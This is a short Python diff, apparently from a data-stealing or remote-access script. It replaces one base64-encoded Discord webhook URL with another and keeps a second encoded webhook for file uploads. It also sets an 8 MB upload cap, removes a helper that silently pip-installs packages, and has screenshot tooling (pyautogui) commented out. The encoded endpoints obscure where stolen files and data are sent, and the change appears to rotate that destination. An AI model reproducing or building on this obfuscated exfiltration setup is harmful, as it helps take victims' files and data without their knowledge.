@@ -4,31 +4,10 @@ import urllib.request
 import time
 from pathlib import Path
 
-WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NzAwNjk4NTAzMDI3MTA3Ni9xdUVRY0VxcEFGN3c2TUg4REduSlRtaTBuSUtFVGl2WXpMbEpVNlNSLUpsSWxGYmNLaUtFNDVlczZ1ZGxmOGVFQklBZw=="
+WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1OTQ1ODQ1MTA2NTkyOTc1MS9qQlZxRmJZdW9ya3M2VVY3aE03MzZ3SFduSTB1OEk5c1NfM2RZVGdMV3g5bVZwZnVVS0hHRzFkZVlUZ0hvazJLazVqdQ=="
 FILE_WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNDUzNDE5ODU0NTk0MDU2MS92c0dhXzVaTTFFU2NaUlFKTU5qdWpTWm5mYnFXWEtXRm00S3Zqd1JwU29HQmdlN0NVYlluMHJSV18wYWZhY3k3czIzNQ=="
 
 MAX_FILE_SIZE = 8 * 1024 * 1024
-
-def ensure_package(package_name, import_name):
-    """
-    Ensure a Python package is installed.
-    
-    :param package_name: Name used by pip (e.g. 'pywin32')
-    :param import_name: Module to test import (e.g. 'win32com.client')
-    """
-    try:
-        importlib.import_module(import_name)
-    except ImportError:
-        subprocess.check_call([
-            sys.executable,
-            "-m",
-            "pip",
-            "install",
-            "--upgrade",
-            package_name,
-        ])
-
-# ensure_package("pyautogui", "pyautogui")
 
 try:
     # import pyautogui
